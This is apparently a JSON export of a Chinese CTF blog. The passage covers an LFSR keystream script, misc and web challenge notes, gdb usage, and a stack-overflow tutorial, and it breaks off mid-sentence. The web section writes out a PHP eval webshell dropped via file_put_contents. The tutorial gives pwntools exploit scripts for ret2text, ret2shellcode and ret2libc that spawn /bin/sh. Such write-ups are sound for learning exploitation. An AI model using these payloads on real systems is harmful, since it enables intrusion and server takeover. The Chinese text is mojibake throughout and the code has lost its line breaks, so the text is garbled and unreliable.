def__init__(self, init, mask, length):Â  Â  Â  Â Â self.init = initÂ  Â  Â  Â Â self.mask = maskÂ  Â  Â  Â Â self.lengthmask =Â 2**(length+1)-1Â  Â Â defnext(self):Â  Â  Â  Â  nextdata = (self.init &lt;&lt;Â 1) &amp;Â self.lengthmaskÂ Â  Â  Â  Â  i =Â self.init &amp;Â self.mask &amp;Â self.lengthmaskÂ Â  Â  Â  Â  output =Â 0Â  Â  Â  Â Â whileÂ i !=Â 0:Â  Â  Â  Â  Â  Â  output ^= (i &amp;Â 1)Â  Â  Â  Â  Â  Â  i = i &gt;&gt;Â 1Â  Â  Â  Â  nextdata ^= outputÂ  Â  Â  Â Â self.init = nextdataÂ  Â  Â  Â Â returnÂ outputdefcombine(x1,x2,x3):Â  Â Â returnÂ (x1*x2)^(x2*x3)^(x1*x3)ifÂ __name__==&quot;__main__&quot;:Â  Â  l1 = lfsr(int.from_bytes(init1,&quot;big&quot;),0b100000000000000000000000010000000000000000000000,48)Â  Â  l2 = lfsr(int.from_bytes(init2,&quot;big&quot;),0b100000000000000000000000000000000010000000000000,48)Â  Â  l3 = lfsr(int.from_bytes(init3,&quot;big&quot;),0b100000100000000000000000000000000000000000000000,48)Â  Â Â withopen(&quot;keystream&quot;,&quot;wb&quot;)Â asÂ f:Â  Â  Â  Â Â forÂ iÂ inrange(8192):Â  Â  Â  Â  Â  Â  b =Â 0Â  Â  Â  Â  Â  Â Â forÂ jÂ inrange(8):Â  Â  Â  Â  Â  Â  Â  Â  b = (b&lt;&lt;1)+combine(l1.next(),l2.next(),l3.next())Â  Â  Â  Â  Â  Â  f.write(chr(b).encode())\n\n\n\nMisc1é¢˜ç›®é™„ä»¶æ˜¯ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œç›´æ¥çˆ†ç ´ã€‚\n\næ‰“å¼€æ–‡æ¡£å…¨é€‰å¤åˆ¶\n\nç²˜è´´ä¸€ä¸‹å°±èƒ½çœ‹åˆ°flag\n\nMisc2 é”®ç›˜æµé‡\nMisc3 æ•°æ®åŒ…åˆ†æé™„ä»¶é‡Œçš„.exeæ˜¯å‹ç¼©åŒ…ï¼Œä¿®æ”¹åç¼€è§£å‹ã€‚\n\næ‰¾åˆ°æµé‡åŒ…å…¨å±€æœç´¢flagä»¥åŠflagå…¶ä»–ç¼–ç å½¢å¼ã€‚\n\n16è¿›åˆ¶è§£ç \n\nMisc4å·¥ä¸šæµé‡åˆ†æ\n\næŒ‰ç…§æ—¶é—´æ’åºï¼Œæœ€å…ˆSTOPçš„åŒ…ã€‚\nflag&#123;ac6417423bb3000c&#125;\n\n\n\nweb rceæ–¹æ³•ä¸€ï¼ˆæ‰“å°ç¼–ç çš„flagï¼‰ip/?cmd=print(base64_encode(file_get_contents(base64_decode(&quot;ZmxhZy5waHA=&quot;))));\n\næ–¹æ³•äºŒï¼ˆå†™å…¥webshellï¼‰ç›´æ¥å†™å…¥ä¸€ä¸ªwebshell\nfile_put_contents(    base64_decode(&quot;c2hlbGwucGhw&quot;),  // &quot;shell.php&quot;    base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;)  // &quot;&lt;?php @eval(\\$_POST[x]); ?&gt;&quot;);\n\nè¿›è¡Œç¼–ç åä¸ºï¼š\nip/?cmd=file_put_contents(base64_decode(&quot;c2hlbGwucGhw&quot;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd\n\n\n\nweb äºŒæ¬¡ç¼–ç ç›´æ¥è®¿é—®/flag.phpå°±å¯ä»¥å¾—åˆ°flag.php\nweb sqlç›´æ¥ç”¨sqlmapã€‚\n","categories":["WP"],"tags":["WP"]},{"title":"gdbè°ƒè¯•","url":"/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/","content":"TABï¼šæ˜¾ç¤ºæ‰€æœ‰å‘½ä»¤\n\nstart:è¿è¡Œåˆ°ç¨‹åºå…¥å£å¤„\nrun:è¿è¡Œå®Œæ•´ä¸ªç¨‹åº\nğŸ” x å‘½ä»¤çš„åŸºæœ¬è¯­æ³•ï¼šx&#x2F;nfs  address\n\nn ï¼šè¦æ˜¾ç¤ºçš„å†…å­˜å•å…ƒä¸ªæ•°ï¼ˆé»˜è®¤æ˜¯ 1ï¼‰ã€‚\nf ï¼šæ˜¾ç¤ºæ ¼å¼ï¼ˆformatï¼‰ï¼Œæ¯”å¦‚åå…­è¿›åˆ¶ã€åè¿›åˆ¶ã€å­—ç¬¦ä¸²ç­‰ã€‚\ns ï¼šå†…å­˜å•å…ƒå¤§å°ï¼ˆsizeï¼‰ï¼Œæ¯”å¦‚å­—èŠ‚ã€åŠå­—ã€å­—ç­‰ã€‚\naddress ï¼šè¦æŸ¥çœ‹çš„å†…å­˜åœ°å€ï¼ˆå¯ä»¥æ˜¯å˜é‡åã€å¯„å­˜å™¨ã€æŒ‡é’ˆè¡¨è¾¾å¼ç­‰ï¼‰ã€‚\n\nfï¼šè¾“å‡ºæ ¼å¼ï¼ˆformatï¼‰\n\n\n\n\n\n\n\nx\nHexï¼ˆåå…­è¿›åˆ¶ï¼‰\n\n\nd\nDecimalï¼ˆåè¿›åˆ¶ï¼‰\n\n\nu\nUnsigned decimal\n\n\no\nOctalï¼ˆå…«è¿›åˆ¶ï¼‰\n\n\nt\nBinaryï¼ˆäºŒè¿›åˆ¶ï¼‰\n\n\nf\nFloating pointï¼ˆæµ®ç‚¹æ•°ï¼‰\n\n\na\nAddressï¼ˆåœ°å€ï¼Œæ˜¾ç¤ºæŒ‡é’ˆï¼‰\n\n\ni\nInstructionï¼ˆåæ±‡ç¼–æŒ‡ä»¤ï¼‰\n\n\nc\nCharï¼ˆå­—ç¬¦ï¼‰\n\n\ns\nStringï¼ˆå­—ç¬¦ä¸²ï¼‰\n\n\nsï¼šå†…å­˜å•å…ƒå¤§å°ï¼ˆsizeï¼‰\n\n\n\n\n\n\n\n\nb\nbyteï¼ˆå­—èŠ‚ï¼‰\n1 å­—èŠ‚\n\n\nh\nhalfwordï¼ˆåŠå­—ï¼‰\n2 å­—èŠ‚\n\n\nw\nwordï¼ˆå­—ï¼‰\n4 å­—èŠ‚\n\n\ng\ngiant wordï¼ˆåŒå­—ï¼‰\n8 å­—èŠ‚\n\n\nğŸ§  ç¤ºä¾‹ç”¨æ³•\n1.æŸ¥çœ‹åœ°å€ 0x7fffffffe000 å¤„çš„ 4 ä¸ª 4 å­—èŠ‚æ•°å€¼ï¼Œä»¥åå…­è¿›åˆ¶æ˜¾ç¤ºï¼š\nx/4wx 0x7fffffffe000\n\nè¾“å‡º\n0x7fffffffe000: 0x00000001  0x00007fff  0x00000000  0x00000000\n\n\n\n\n\n2. æŸ¥çœ‹åœ°å€ 0x400500 å¤„çš„ 5 æ¡æ±‡ç¼–æŒ‡ä»¤ï¼š\nx/5i 0x400500\n\nè¾“å‡º\n0x400500:  push   %rbp0x400501:  mov    %rsp,%rbp0x400504:  sub    $0x10,%rsp0x400508:  mov    %edi,-0x4(%rbp)0x40050b:  mov    %rsi,-0x10(%rbp)\n\n\n\n\n\n3. æŸ¥çœ‹æ ˆé¡¶æŒ‡é’ˆ rsp åœ°å€çš„å†…å®¹ï¼ˆä»¥ 8 å­—èŠ‚ä¸ºå•ä½ï¼Œæ˜¾ç¤ºä¸ºåå…­è¿›åˆ¶ï¼‰ï¼š\nx/gx $rsp\n\nè¾“å‡º\nx/gx $rsp\n\n\n\n\n\n4. æŸ¥çœ‹åœ°å€ 0x7fffffffe010 å¼€å§‹çš„å­—ç¬¦ä¸²ï¼š\nx/s 0x7fffffffe010\n\nè¾“å‡º\n0x7fffffffe010: &quot;Hello, world!&quot;\n\n\n\n\n\n5.æŸ¥çœ‹åœ°å€ 0x601038 çš„ 10 ä¸ªå­—èŠ‚ï¼Œä»¥åè¿›åˆ¶å½¢å¼æ˜¾ç¤ºï¼š\nx/10db 0x601038\n\nè¾“å‡º\n0x601038: 72  101  108  108  111  44  32  119  111  114\n\n\n\n\n\n:small_airplane:æ¥æ”¶æ•°æ®\n\n\nå‡½æ•°\nè¯´æ˜\n\n\n\nrecvall()\næ¥æ”¶æ‰€æœ‰æ•°æ®ç›´åˆ° EOF\n\n\nrecvline()\næ¥æ”¶ä¸€è¡Œï¼ˆä»¥\\nç»“å°¾ï¼‰\n\n\nrecvuntil(delim)\næ¥æ”¶æ•°æ®ç›´åˆ°é‡åˆ°æŒ‡å®šåˆ†éš”ç¬¦ï¼ˆå¦‚&quot;Welcome!&quot;ï¼‰\n\n\nrecvregex(regex)\næ¥æ”¶æ•°æ®ç›´åˆ°åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼\n\n\nrecv(n)\næ¥æ”¶æŒ‡å®šå­—èŠ‚æ•°çš„æ•°æ®ï¼ˆé˜»å¡ç›´åˆ°æ”¶åˆ° n å­—èŠ‚ï¼‰\n\n\n","categories":["pwn_study"],"tags":["PWN","gdb"]},{"title":"åˆè¯†æ ˆæº¢å‡º","url":"/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/","content":"\nfun(a,b)è°ƒç”¨è¿‡ç¨‹å…¥æ ˆ\nï¼ˆ1ï¼‰å‹å…¥å‚æ•° \næ ¹æ®è°ƒç”¨çº¦å®šï¼Œmainå‡½æ•°ä½œä¸ºè°ƒç”¨è€…ï¼Œé¦–å…ˆéœ€è¦å°†funcå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°a,bå‹å…¥æ ˆä¸­ã€‚\næ³¨æ„å‹å…¥å‚æ•°çš„é¡ºåºï¼Œé¦–å…ˆå‹å…¥bï¼Œæ¥ç€å‹å…¥aï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‹å…¥å‚æ•°çš„é¡ºåºæ˜¯ä»å³åˆ°å·¦ã€‚\nï¼ˆ2ï¼‰è¿”å›åœ°å€å‹æ ˆ\nè¿”å›åœ°å€å‹æ ˆã€‚mainå‡½æ•°ä¸ºäº†è®©funcå‡½æ•°è°ƒç”¨åæ­£å¸¸è¿”å›ï¼Œéœ€è¦å°†å½“å‰æŒ‡ä»¤ï¼ˆcallæŒ‡ä»¤ï¼‰çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­\ncallæŒ‡ä»¤åŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼šmainå‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤å‹æ ˆï¼›æ§åˆ¶eipä¸ºfuncå‡½æ•°çš„ç¬¬ä¸€æ¡è¯­å¥ï¼Œeipå­˜å‚¨ç€CPUå°†è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€\nï¼ˆ3ï¼‰funcå‡½æ•°è¿è¡Œ\nfuncå‡½æ•°éœ€è¦è‡ªå·±çš„å†…éƒ¨è¿ä½œç©ºé—´ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤åºåˆ—å¼€è¾Ÿç©ºé—´ï¼špush ebp   mov ebp,esp  sub esp,28h\nè¿™ä¸ª28hå°±æ˜¯å¼€è¾Ÿçš„å­˜å‚¨funcå‡½æ•°çš„ç›¸å…³å†…å­˜çš„ç©ºé—´\n\nmov ebp,espçœ‹ä¼¼æ²¡æœ‰å˜åŒ–ï¼Œä½†EBP ä»â€œä¿å­˜è°ƒç”¨è€…åŸºå€â€å˜ä¸ºâ€œå½“å‰å‡½æ•°çš„æ ˆå¸§åŸºå€â€ã€‚\nï¼ˆ4ï¼‰funcå‡½æ•°çš„å±€éƒ¨å˜é‡å’Œå‚æ•°\nfuncå‡½æ•°æœ‰è‡ªå·±å†…éƒ¨çš„è¿ä½œç©ºé—´ï¼Œå³func_ebpåˆ°func_esp\nå±€éƒ¨å˜é‡åœ¨ç¼–è¯‘ä¹‹åä¼šè¢«è¡¨ç¤ºä¸ºä¸ebp ä¸åŒçš„è·ç¦»\n\nv2è¢«è¡¨ç¤ºä¸ºebp -18hï¼Œv3è¢«è¡¨ç¤ºä¸ºebp -10hã€‚\næ³¨æ„ï¼Œè¿™é‡Œçš„v2, v3å’Œv4éƒ½æ˜¯å±€éƒ¨å˜é‡ã€‚å‚æ•°çš„è¯»å–æ–¹å¼ä¾‹å­:ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ebp+8ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ebp+12\nå› ä¸ºè°ƒç”¨çº¦å®šï¼Œè‚¯å®šæœ‰main_nextå’Œmain_ebpåœ¨ebpçš„ä¸Šæ–¹ï¼Œæ•…åç§»æ˜¯å›ºå®šçš„ï¼Œåœ¨è¿”å›åœ°å€main_nextä¸Šé¢\nç„¶åï¼Œfuncå‡½æ•°è¿”å›ã€‚ä¸¤ä¸ªæ­¥éª¤ï¼šæ¸…é™¤æ ˆç©ºé—´ï¼Œè¿”å›åˆ°ä¹‹å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆmain_nextï¼‰å¤„ã€‚\n(5)funcå‡½æ•°è¿”å›æ­¥éª¤1:æ¸…é™¤æ ˆç©ºé—´\næ¯ä¸ªå‡½æ•°æ¸…é™¤æ ˆç©ºé—´æ—¶å¯ä»¥ä½¿ç”¨ä¸€æ¡å…¬ç”¨æŒ‡ä»¤leaveã€‚\nleaveåŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼š\nâ‘ mov esp,ebpå°†æ ˆé¡¶è®¾ç½®ä¸ºæ ˆåŸºï¼Œå³å°†func_ebpåˆ°func_espçš„å†…å®¹å…¨éƒ¨å‡ºæ ˆï¼›\nâ‘¡pop ebp å°†main_ebpçš„å†…å®¹é‡æ–°å¼¹å›ebpï¼Œä½¿mainå‡½æ•°çš„æ ˆåŸºå€å¾—åˆ°æ¢å¤\n(6)funcå‡½æ•°è¿”å›æ­¥éª¤2ï¼šè¿”å›ä¹‹å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆmain_nextï¼‰å¤„\næ¯ä¸ªå‡½æ•°è¿”å›æ—¶å¯ä»¥ä½¿ç”¨ä¸€æ¡å…¬ç”¨æŒ‡ä»¤retã€‚retåŒ…å«ä¸€ä¸ªæ­¥éª¤ï¼šå°†æ ˆé¡¶å¼¹å‡ºåˆ°eipå¯„å­˜å™¨ï¼ˆå³ä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ï¼‰ï¼Œè¾¾åˆ°æ¢å¤mainå‡½æ•°æ‰§è¡Œé¡ºåºçš„\nç›®çš„ã€‚\nåˆ°è¿™é‡Œï¼Œmainå‡½æ•°çš„æ ˆåŸºå€å’Œä¸‹ä¸€æ¡æŒ‡ä»¤éƒ½å¾—åˆ°äº†æ¢å¤ï¼Œä¹Ÿå°±å®Œæˆäº†æ•´ä¸ªfuncå‡½æ•°çš„è°ƒç”¨ã€‚\n\nLinuxæ“ä½œç³»ç»Ÿçš„ä¿æŠ¤\n Arch:amd64-64-littleï¼š\namd64å³x86_64(CPUæ¶æ„)                 \n64å³å­—é•¿ä¸º64ï¼Œè¿”å›åœ°å€åœ¨æ ˆä¸­å  8å­—èŠ‚ï¼Œ32ä½æ˜¯4å­—èŠ‚ï¼‰\nlittleè¡¨ç¤ºå°ç«¯åºï¼Œå¦‚æœæ˜¯bigåˆ™è¡¨ç¤ºå¤§ç«¯åºã€‚ä»¥æ•°å­—0x12345678ä¸ºä¾‹ï¼Œå°ç«¯åºå­˜å‚¨çš„æ˜¯\\x78\\x56\\x34\\x12ï¼Œå¤§ç«¯åºå­˜å‚¨çš„æ˜¯\\x12\\x34\\x56\\x78\nRELROï¼šPartial RELRO:\nPartial RELROå’ŒFull RELROçš„åŒºåˆ«å¯ä»¥ç®€å•ç†è§£ä¸ºGOTå†™æƒé™çš„åŒºåˆ«ï¼ŒPartial RELROç›¸å½“äºGOTå¯å†™ï¼ŒFull RELROç›¸å½“äºGOTä¸å¯å†™ã€‚\nNXï¼šNX enabled:\nå¦‚æœå¼€å¯äº†NXä¿æŠ¤æœºåˆ¶ï¼Œé‚£ä¹ˆwæƒé™å’Œxæƒé™å°±æ˜¯äº’æ–¥çš„,å³ä¸å­˜åœ¨æ—¢æ‹¥æœ‰å†™æƒé™åˆæ‹¥æœ‰æ‰§è¡Œæƒé™çš„æ®µã€‚è¿™ä¸ªä¿æŠ¤æœºåˆ¶æ˜¯ç”¨æ¥é˜²æ­¢shellcodeæ¤å…¥çš„ã€‚åœ¨gdbè°ƒè¯•ä¸­ï¼Œå¯ä»¥é€šè¿‡vmmapå‘½ä»¤æ¥æŸ¥çœ‹æ¯ä¸ªæ®µçš„æƒé™ã€‚\nPIEï¼šNo PIEï¼ˆ0x8048000ï¼‰\nret2text(è¦†ç›–è¿”å›åœ°å€)è¯¥å‡½æ•°å†…å­˜åœ¨getæ¼æ´\n\nè¯¥å‡½æ•°æ³„éœ²äº†åé—¨å‡½æ•°\næ¥ç€é€šè¿‡getså‡½æ•°æ ˆæº¢å‡ºå°†è¿™ä¸ªåœ°å€æ”¹ä¸ºtargetï¼Œé‚£ä¹ˆvulnfuncè¿”å›çš„æ—¶å€™ï¼Œç”¨retæŒ‡ä»¤å–å‡ºæ ˆé¡¶çš„å…ƒç´ è¿”å›ï¼Œå°±ä¼šè¿”å›åˆ°targetè¿™ä¸ªå‡½æ•°\ntargetå‡½æ•°ä¸­æœ‰systemï¼ˆâ€&#x2F;bin&#x2F;shâ€ï¼‰è¿™ä¸ªåé—¨ï¼Œç±»ä¼¼äºåœ¨Linuxçš„ç»ˆç«¯ç›´æ¥è°ƒç”¨&#x2F;bin&#x2F;shã€‚åˆ©ç”¨è¿™ç§æ–¹å¼å¯ä»¥ç›´æ¥è¿”å›ä¸€ä¸ªshellï¼Œè¿›è€Œå¾—åˆ°ç›®æ ‡ä¸»æœºçš„shellï¼Œæ‹¿åˆ°æ§åˆ¶æƒã€‚\næ‰¾å¡«å……å­—èŠ‚\nç›´æ¥ä»IDAä¸­è¯»å‡ºé•¿åº¦\n\nsåˆ°vulnfuncçš„ebpçš„è·ç¦»æ˜¯108hï¼Œæ‰€ä»¥åˆ°main_nextçš„è·ç¦»æ˜¯0x108+4\né‚£ä¸ª4æ˜¯32ä½çš„ebpçš„ç©ºé—´\nè„šæœ¬from pwn import *p = process(&quot;./ret2text&quot;)p.recvuntil(&quot;ret2text\\n&quot;)payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)p.sendline(payload)p.interactive()\n\nret2shellcodeï¼ˆè¦†ç›–è¿”å›åœ°å€åˆ°Shellcodeï¼‰Shellcodeæ˜¯æœºå™¨ç æ ¼å¼çš„æ¶æ„ä»£ç ï¼ŒæŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸ç”¨çš„åŠŸèƒ½æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯å‘æ ˆä¸­å†™å†…å®¹ï¼Œæ‰€ä»¥è¦æƒ³æ‰§è¡ŒShellcodeï¼Œå°±è¦æ±‚å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰å¼€å¯NXä¿æŠ¤\n\n printf(&quot;%p\\n&quot;, s)è¾“å‡ºäº†Sçš„ç¼“å†²åŒºçš„ä½ç½®\n\næ²¡æœ‰å¼€å¯NXä¿æŠ¤\næ‰€ä»¥å¯ä»¥å‘è¿›ç¨‹ä¸­å†™å…¥ä¸€æ®µShellcodeï¼ˆåˆ©ç”¨wå†™æƒé™ï¼‰ï¼Œå†æ‰§è¡Œè¿™æ®µShellcodeï¼ˆåˆ©ç”¨xæ‰§è¡Œæƒé™ï¼‰ã€‚\nè„šæœ¬from pwn import *context.arch = &quot;i386&quot;p = process(&quot;./ret2shellcode&quot;)#gdb.attach(p,&quot;b *0x08048593&quot;)p.recvuntil(b&quot;ret2shellcode\\n&quot;) # ä¿®æ”¹ä¸ºå­—èŠ‚ä¸²target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) # ä¿®æ”¹ä¸ºå­—èŠ‚ä¸²sc = asm(shellcraft.sh())payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) p.sendline(payload)p.interactive()\n\ncontext.arch = &quot;i386&quot;è¯´æ˜ç¨‹åºçš„æ¶æ„ï¼Œä½¿ç”¨ asm() å‡½æ•°å°† shellcode (shellcraft.sh()) æ±‡ç¼–æˆæœºå™¨ç æ—¶ï¼Œpwntools éœ€è¦çŸ¥é“ç›®æ ‡æ¶æ„æ˜¯ 32 ä½è¿˜æ˜¯ 64 ä½ï¼Œä»¥ä¾¿ç”Ÿæˆæ­£ç¡®çš„æŒ‡ä»¤é›†ã€‚32 ä½å’Œ 64 ä½çš„æŒ‡ä»¤æ˜¯ä¸åŒçš„ã€‚\ntarget = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) æ¥æ”¶çŸ¥é“è¯»å–åˆ°&#x2F;nï¼Œ(è¾“å‡ºçš„ç¼“å†²åŒºçš„åœ°å€)ï¼Œè½¬åŒ–ä¸ºåå…­è¿›åˆ¶æ•´æ•°ï¼Œä¸”drop = Trueæ–¹ä¾¿åœ°æ¸…ç†ä½ æ¥æ”¶åˆ°çš„æ•°æ®ã€‚åªæå–æŸä¸ªæ¨¡å¼ï¼ˆæ¯”å¦‚ä¸€ä¸ªåœ°å€ã€ä¸€ä¸ªæ•°å­—æˆ–ä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸²ï¼‰è€Œä¸åŒ…å«ç”¨äºåˆ†éš”æˆ–ç»ˆæ­¢çš„å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ã€ç©ºæ ¼ã€å†’å·ç­‰ï¼‰\nsc = asm(shellcraft.sh())ç”Ÿæˆå¯åŠ¨/bin/shçš„æœºå™¨ç \npayload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target) ä»å³åˆ°å·¦å…¥æ ˆï¼Œp32(target):è¦†ç›–è¿”å›åœ°å€ï¼Œbâ€™aâ€™ * (0x108 + 4 - len(sc)):å¡«å……ä»scç»“æŸä½ç½®åˆ°è¿”å›åœ°å€ä¹‹é—´æ‰€æœ‰â€œæ— ç”¨â€çš„æ ˆç©ºé—´ã€‚sc:å½“ scä½äºç¼“å†²åŒºçš„èµ·å§‹ä½ç½®ã€‚\ncontext(arch &#x3D; â€˜amd64â€™, os &#x3D; â€˜linuxâ€™, log_level &#x3D; â€˜debugâ€™)\nè¿™ç§contextçš„ä¿¡æ¯å¯ä»¥é€šè¿‡æŒ‡ä»¤file+æ–‡ä»¶å å¾—åˆ°\nè¾“å‡ºç¤ºä¾‹ï¼š\nmrctf2020_shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, â€¦\n\nè¿™é‡Œå…³é”®çš„ä¿¡æ¯ï¼š\n\nELF â†’ è¯´æ˜æ˜¯ Linux\n64-bit â†’ è¯´æ˜æ˜¯ 64 ä½\nx86-64 â†’ æ¶æ„å°±æ˜¯ amd64ï¼ˆpwntools é‡Œå†™ amd64ï¼‰\n\nå¦‚æœè¾“å‡ºæ˜¯ï¼š\nELF 32-bit LSB executable, Intel 80386\n\né‚£ä½ å°±ç”¨ï¼š\ncontext(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)\n\nå¦‚æœæ˜¯ï¼š\nELF 32-bit LSB executable, ARM\n\né‚£ä½ å°±ç”¨ï¼š\ncontext(arch=&#x27;arm&#x27;, os=&#x27;linux&#x27;)\n\n\n\n\n\n\n\n\n\nropNX ä¿æŠ¤ (No-Execute): å®ƒçš„å”¯ä¸€ç›®çš„æ˜¯é˜»æ­¢ä½ åœ¨æ•°æ®åŒºåŸŸï¼ˆæ¯”å¦‚æ ˆå’Œå †ï¼‰æ‰§è¡Œä»£ç ã€‚ä½ å¯ä»¥æŠŠæ ˆå’Œå †æƒ³è±¡æˆä¸€å—â€œåªå†™æ•°æ®ï¼Œä¸èƒ½è·‘ç¨‹åºâ€çš„åŒºåŸŸã€‚\n\nå…è®¸ä»€ä¹ˆï¼Ÿ å…è®¸ä½ åœ¨æ ˆä¸Šå†™æ•°æ®ï¼ˆæ¯”å¦‚å¡«å……å­—ç¬¦ä¸² AAAAï¼Œæˆ–è€…ä¸€äº›åœ°å€ï¼‰ã€‚ å…è®¸ä½ ä¿®æ”¹å¯„å­˜å™¨çš„å€¼ã€‚ å…è®¸ä½ è¦†ç›–è¿”å›åœ°å€ã€‚\né˜»æ­¢ä»€ä¹ˆï¼Ÿ é˜»æ­¢ä½ æŠŠè‡ªå·±çš„æ±‡ç¼–ä»£ç ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º Shellcodeï¼‰æ”¾åœ¨æ ˆä¸Šï¼Œç„¶åè®©ç¨‹åºå»æ‰§è¡Œå®ƒã€‚\n\nret2libc1ï¼ˆå•ä¸ªå‡½æ•°çš„ropæ¥é“¾ï¼‰ç¬¬ä¸€æ­¥ï¼Œå…ˆçœ‹ä¿æŠ¤\n\n\ngetæº¢å‡º\n\nsystemå‡½æ•°å­˜åœ¨,ä½†å‚æ•°ä¸æ˜¯&#x2F;bin&#x2F;sh\n\nsystemå‡½æ•°å­˜åœ¨,å¹¶ä¸”ç¨‹åºä¸­å¿ƒå­˜åœ¨bin&#x2F;shå­—ç¬¦ä¸²\næ‰€ä»¥å¯ä»¥æŠŠbin&#x2F;shä½œä¸ºå‚æ•°ä¼ å…¥systemå‡½æ•°ä¸­æ„é€ åé—¨å‡½æ•°\nè¦æ„é€ ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œå…ˆè°ƒç”¨systemå‡½æ•°ï¼Œç„¶åæŒ‰ç…§è°ƒç”¨æµç¨‹ï¼Œå‚æ•°ï¼ˆbin&#x2F;shå­—ç¬¦ä¸²æ‰€åœ¨çš„ä½ç½®ï¼‰å…¥æ ˆï¼Œè¿”å›åœ°å€å…¥æ ˆ\npayloadçš„å½¢å¼æ˜¯**[åƒåœ¾å¡«å……] + [systemå‡½æ•°åœ°å€] + [systemè¿”å›åœ°å€] + [binshå­—ç¬¦ä¸²åœ°å€]**\nè„šæœ¬from pwn import *context.arch = &quot;i386&quot; # å¼ºçƒˆå»ºè®®åŠ ä¸Šè¿™ä¸€è¡Œp = process(&quot;./ret2libc1&quot;)#gdb.attach(p,&quot;b *0x08048595&quot;) # è°ƒè¯•æ—¶å¯ç”¨#elf = ELF(&quot;./ret2libc1&quot;)#system = elf.plt[&quot;system&quot;]binsh = 0x0804A028 # ç¡®ä¿è¿™ä¸ªåœ°å€ç¡®å®åŒ…å« &quot;/bin/sh&quot; å­—ç¬¦ä¸²p.recvuntil(b&quot;ret2libc1\\n&quot;) payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)p.sendline(payload)p.interactive()\n\næ‰¾åˆ°systemå‡½æ•°ä½ç½®\nelf = ELF(&quot;./ret2libc1&quot;)        system = elf.plt[&quot;system&quot;]ç›´æ¥æ‰¾åˆ°systemdçš„å…¥å£\næ³¨æ„\n[systemè¿”å›åœ°å€] ä¸èƒ½ä¹±å†™ï¼Œåé—¨å‡½æ•°æ‰§è¡Œç»“æŸåä¼šè¿”å›è¿™ä¸ªåœ°å€ï¼Œé”™è¯¯çš„åœ°å€ä¼šå¼•å‘å´©æºƒ\n1.elf.plt[&quot;exit&quot;] (æœ€å¸¸ç”¨ï¼Œæ¨è)ï¼š\n\nä½œç”¨ï¼šè®© system(&quot;/bin/sh&quot;) æ‰§è¡Œå®Œæ¯•åï¼Œç¨‹åºèƒ½å¤Ÿå¹²å‡€åœ°è°ƒç”¨ exit() å‡½æ•°å¹¶é€€å‡ºã€‚è¿™æ˜¯æœ€æ¨èçš„åšæ³•ï¼Œå› ä¸ºå®ƒç¡®ä¿äº†ç¨‹åºçš„æ­£å¸¸ç»ˆæ­¢ã€‚\nä¼˜ç‚¹ï¼šç¨³å®šã€å¯é ï¼Œä¸ä¼šå¯¼è‡´å´©æºƒã€‚\nè·å–æ–¹å¼ï¼šelf.plt[&quot;exit&quot;] (pwntools ä¼šè‡ªåŠ¨è§£æ)ã€‚\n\n2.0x0 æˆ–å…¶ä»–æ— æ•ˆåœ°å€ (å¯¼è‡´å´©æºƒ)ï¼š\n\nä½œç”¨ï¼šå¦‚æœä½ åªå…³å¿ƒ system(&quot;/bin/sh&quot;) æ˜¯å¦è¢«æ‰§è¡Œï¼Œè€Œä¸å…³å¿ƒç¨‹åºæ˜¯å¦å´©æºƒï¼Œé‚£ä¹ˆå¯ä»¥éšä¾¿å¡«ã€‚\nä¼˜ç‚¹ï¼šæœ€ç®€å•ã€‚\nç¼ºç‚¹ï¼šç¨‹åºä¼šå´©æºƒï¼Œè¿™åœ¨å®é™…æ”»é˜²ä¸­é€šå¸¸æ˜¯ä¸å¸Œæœ›çœ‹åˆ°çš„ã€‚æœ‰æ—¶è°ƒè¯•æ—¶ä¸ºäº†å¿«é€ŸéªŒè¯ system æ˜¯å¦è¢«è°ƒç”¨ï¼Œå¯èƒ½ä¼šæš‚æ—¶ä½¿ç”¨ã€‚\n\nret2libc2(ä¸¤ä¸ªå‡½æ•°çš„ropé“¾)\nè¯¥é¢˜æ²¡æœ‰bin&#x2F;shå­—ç¬¦ä¸²\n\næ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±å»é€šè¿‡getæ„é€ \n(1)funcå‡½æ•°é€šè¿‡æ 